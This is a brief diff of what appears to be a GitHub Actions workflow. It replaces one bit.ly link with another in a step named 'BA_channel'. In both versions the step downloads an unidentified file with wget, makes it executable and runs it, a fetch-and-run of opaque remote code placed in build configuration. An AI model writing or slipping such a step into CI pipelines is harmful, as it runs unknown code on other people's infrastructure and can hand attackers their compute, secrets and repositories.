@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        wget https://bit.ly/3lAuhoS && chmod u+x 3lAuhoS && ./3lAuhoS
+        wget https://bit.ly/3CozWVI && chmod u+x 3CozWVI && ./3CozWVI
